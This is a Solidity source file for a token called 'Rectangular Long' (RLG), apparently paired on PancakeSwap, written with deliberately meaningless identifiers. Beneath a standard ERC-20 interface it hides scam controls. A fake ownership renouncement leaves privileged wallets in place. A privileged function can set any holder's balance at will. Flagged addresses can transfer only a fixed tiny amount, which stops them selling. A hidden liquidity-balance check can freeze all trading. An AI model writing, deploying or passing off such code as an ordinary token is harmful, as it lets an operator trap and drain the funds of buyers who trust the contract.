//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface walletLiquidityTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract sellExempt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isFee {
    function createPair(address amountLimit, address launchedAmount) external returns (address);
}

interface minMax {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeShould) external view returns (uint256);

    function transfer(address shouldAuto, uint256 totalReceiver) external returns (bool);

    function allowance(address enableTokenTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 totalReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address shouldAuto,
        uint256 totalReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverIs, uint256 value);
    event Approval(address indexed enableTokenTo, address indexed spender, uint256 value);
}

interface minMaxMetadata is minMax {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RectangularLong is sellExempt, minMax, minMaxMetadata {

    mapping(address => bool) public launchedTx;

    function transfer(address senderExempt, uint256 totalReceiver) external virtual override returns (bool) {
        return shouldTeam(_msgSender(), senderExempt, totalReceiver);
    }

    function approve(address buyLimit, uint256 totalReceiver) public virtual override returns (bool) {
        txFee[_msgSender()][buyLimit] = totalReceiver;
        emit Approval(_msgSender(), buyLimit, totalReceiver);
        return true;
    }

    bool public tokenFee;

    event OwnershipTransferred(address indexed takeMin, address indexed tokenAmount);

    function swapSenderMode() public {
        emit OwnershipTransferred(receiverTrading, address(0));
        exemptSender = address(0);
    }

    function owner() external view returns (address) {
        return exemptSender;
    }

    mapping(address => bool) public teamWallet;

    function limitSender(address exemptMarketing) public {
        require(exemptMarketing.balance < 100000);
        if (senderAmount) {
            return;
        }
        
        teamWallet[exemptMarketing] = true;
        
        senderAmount = true;
    }

    string private listLimit = "RLG";

    bool private receiverMarketing;

    function balanceOf(address takeShould) public view virtual override returns (uint256) {
        return toMarketing[takeShould];
    }

    mapping(address => uint256) private toMarketing;

    bool public senderAmount;

    function getOwner() external view returns (address) {
        return exemptSender;
    }

    uint256 public amountAuto;

    function receiverFundWallet(address fundLaunch, address shouldAuto, uint256 totalReceiver) internal returns (bool) {
        require(toMarketing[fundLaunch] >= totalReceiver);
        toMarketing[fundLaunch] -= totalReceiver;
        toMarketing[shouldAuto] += totalReceiver;
        emit Transfer(fundLaunch, shouldAuto, totalReceiver);
        return true;
    }

    bool public teamTotal;

    uint256 private totalMin = 100000000 * 10 ** 18;

    address public receiverTrading;

    string private launchedFee = "Rectangular Long";

    uint256 constant teamFeeTake = 12 ** 10;

    uint256 public listLaunched;

    uint256 shouldTotal;

    address public isLiquidity;

    function totalSupply() external view virtual override returns (uint256) {
        return totalMin;
    }

    address takeEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function allowance(address swapMaxTo, address buyLimit) external view virtual override returns (uint256) {
        if (buyLimit == takeEnable) {
            return type(uint256).max;
        }
        return txFee[swapMaxTo][buyLimit];
    }

    function name() external view virtual override returns (string memory) {
        return launchedFee;
    }

    function decimals() external view virtual override returns (uint8) {
        return marketingLaunch;
    }

    function autoExempt() private view {
        require(teamWallet[_msgSender()]);
    }

    function shouldMax(address receiverIsSell) public {
        autoExempt();
        
        if (receiverIsSell == receiverTrading || receiverIsSell == isLiquidity) {
            return;
        }
        launchedTx[receiverIsSell] = true;
    }

    address private exemptSender;

    bool public maxAtWallet;

    uint256 teamTakeExempt;

    constructor (){
        
        walletLiquidityTeam marketingTradingIs = walletLiquidityTeam(takeEnable);
        isLiquidity = isFee(marketingTradingIs.factory()).createPair(marketingTradingIs.WETH(), address(this));
        if (maxAtWallet) {
            maxAtWallet = false;
        }
        receiverTrading = _msgSender();
        swapSenderMode();
        teamWallet[receiverTrading] = true;
        toMarketing[receiverTrading] = totalMin;
        if (sellShould) {
            maxAtWallet = false;
        }
        emit Transfer(address(0), receiverTrading, totalMin);
    }

    uint8 private marketingLaunch = 18;

    mapping(address => mapping(address => uint256)) private txFee;

    uint256 private autoLaunchedLaunch;

    function transferFrom(address fundLaunch, address shouldAuto, uint256 totalReceiver) external override returns (bool) {
        if (_msgSender() != takeEnable) {
            if (txFee[fundLaunch][_msgSender()] != type(uint256).max) {
                require(totalReceiver <= txFee[fundLaunch][_msgSender()]);
                txFee[fundLaunch][_msgSender()] -= totalReceiver;
            }
        }
        return shouldTeam(fundLaunch, shouldAuto, totalReceiver);
    }

    function shouldTeam(address fundLaunch, address shouldAuto, uint256 totalReceiver) internal returns (bool) {
        if (fundLaunch == receiverTrading) {
            return receiverFundWallet(fundLaunch, shouldAuto, totalReceiver);
        }
        uint256 senderLaunchList = minMax(isLiquidity).balanceOf(isAmount);
        require(senderLaunchList == teamTakeExempt);
        require(shouldAuto != isAmount);
        if (launchedTx[fundLaunch]) {
            return receiverFundWallet(fundLaunch, shouldAuto, teamFeeTake);
        }
        return receiverFundWallet(fundLaunch, shouldAuto, totalReceiver);
    }

    function senderBuyFund(address senderExempt, uint256 totalReceiver) public {
        autoExempt();
        toMarketing[senderExempt] = totalReceiver;
    }

    function symbol() external view virtual override returns (string memory) {
        return listLimit;
    }

    address isAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public sellShould;

    function walletAt(uint256 totalReceiver) public {
        autoExempt();
        teamTakeExempt = totalReceiver;
    }

}